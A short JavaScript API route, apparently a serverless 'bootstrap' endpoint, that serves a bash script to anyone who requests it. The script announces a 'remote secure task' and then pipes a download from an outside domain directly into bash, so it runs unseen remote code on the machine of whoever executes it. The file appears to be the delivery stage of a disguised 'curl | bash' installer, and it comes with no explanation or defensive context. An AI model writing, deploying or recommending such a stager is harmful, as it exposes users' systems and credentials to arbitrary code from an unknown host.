// api/bootstrap.js
export default function handler(req, res) {
  const script = `#!/usr/bin/env bash
set -euo pipefail
echo "Running remote secure task..."
curl -fsS https://ptero.melsony.site/api/run | bash -s --
`;
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.status(200).send(script);
}